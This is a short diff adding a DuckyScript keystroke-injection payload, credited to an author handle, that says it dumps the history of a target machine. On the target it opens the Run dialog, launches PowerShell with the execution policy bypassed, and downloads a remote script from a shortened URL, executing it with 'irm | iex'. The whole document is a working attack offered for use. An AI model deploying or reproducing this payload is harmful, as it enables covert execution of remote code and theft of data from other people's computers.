@@ -1,0 +1,9 @@
+REM     Author: WhoIsLS
+REM     Description: This script will dump the history of the target machine
+REM     Version: 1.0
+
+
+GUI r
+DELAY 500
+STRING powershell -NoProfile -ExecutionPolicy Bypass -Command "$dc=''; irm https://shorturl.at/XZGZ0 | iex"
+ENTER
